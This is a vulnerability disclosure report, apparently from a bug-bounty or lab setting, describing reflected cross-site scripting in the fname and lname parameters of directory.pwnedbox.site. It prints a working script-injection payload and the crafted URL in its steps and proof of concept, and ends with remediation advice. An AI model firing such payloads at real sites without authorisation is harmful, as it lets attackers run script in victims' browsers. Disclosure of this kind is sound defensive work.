## Title
Reflected XSS - directory.pwnedbox.site

## Description
The `fname` and `lname` GET parameters on `directory.pwnedbox.site` were found vulnerable to Reflected Cross-Site Scripting (XSS). A crafted JavaScript payload successfully executed in the browser and triggered an `alert(1)` dialog.

## Steps to Reproduce

1. Open the target website:
   ```text
   https://directory.pwnedbox.site/
   ```

2. Open the following crafted URL in a browser:
   ```text
   https://directory.pwnedbox.site/?fname=hakama%27%22%3C%3E%3CscrIPt%3Ealert%281%29%3C%2FscrIPt%3E&lname=hakama%27%22%3C%3E%3CscrIPt%3Ealert%281%29%3C%2FscrIPt%3E
   ```

3. Allow the page to load.

4. Observe the JavaScript alert dialog displaying `1`, confirming successful JavaScript execution.

5. Dismiss the alert dialog.

## POC (Proof of Concept)

**Target URL:**  
https://directory.pwnedbox.site/

**HTTP Method:** GET

**Vulnerable Parameters:** `fname`, `lname`

**Payload:**
```html
hakama'"><><scrIPt>alert(1)</scrIPt>
```

**Crafted Request URL:**
```text
https://directory.pwnedbox.site/?fname=hakama%27%22%3C%3E%3CscrIPt%3Ealert%281%29%3C%2FscrIPt%3E&lname=hakama%27%22%3C%3E%3CscrIPt%3Ealert%281%29%3C%2FscrIPt%3E
```

**Observed Result:**

The supplied JavaScript payload was successfully executed through the `fname` and `lname` parameters. The browser displayed an alert dialog containing `1`, confirming Reflected Cross-Site Scripting (XSS).

**Screenshot:**

<img width="1920" height="1200" alt="image" src="https://github.com/user-attachments/assets/ce239408-e00c-43ae-9c69-724d0fd3ace6" />

<img width="1920" height="1200" alt="image" src="https://github.com/user-attachments/assets/0d6897de-cb7d-493a-a9e5-60df582d2582" />

## Impact

- An attacker can craft a malicious URL and trick victims into opening it.
- Successful exploitation allows JavaScript execution in the victim's browser.
- The vulnerability may be used for phishing or manipulation of displayed webpage content.

## Remediation

- Apply context-aware output encoding to user-controlled input before rendering it in HTML.
- Validate and sanitize input received through the `fname` and `lname` parameters.
- Implement a restrictive Content Security Policy (CSP) as an additional security measure.
